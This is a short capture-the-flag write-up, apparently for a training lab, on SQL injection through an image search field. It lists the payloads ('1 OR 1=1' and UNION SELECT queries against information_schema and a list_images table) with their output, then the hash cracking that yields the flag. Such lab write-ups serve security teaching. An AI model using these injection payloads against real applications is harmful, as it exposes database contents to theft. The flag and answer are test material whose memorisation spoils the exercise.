### 03 SQL injection from image search

Same as 02, we put `1 OR 1=1` and we got this.

```
ID: 1 OR 1=1
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

```
ID: 1 union select schema_name, null from information_schema.schemata
Title:
Url : Member_survey
```

```
ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
Title: list_images
Url : id

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
Title: list_images
Url : url

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
Title: list_images
Url : title

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
Title: list_images
Url : comment
```

```
ID: 1 UNION SELECT title, comment FROM list_images
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

Decode `1928e8083cf461a51303633093573c46` with md5 -> `albatroz`

Encode `albatroz` with SHA256 -> `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

FLAG: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
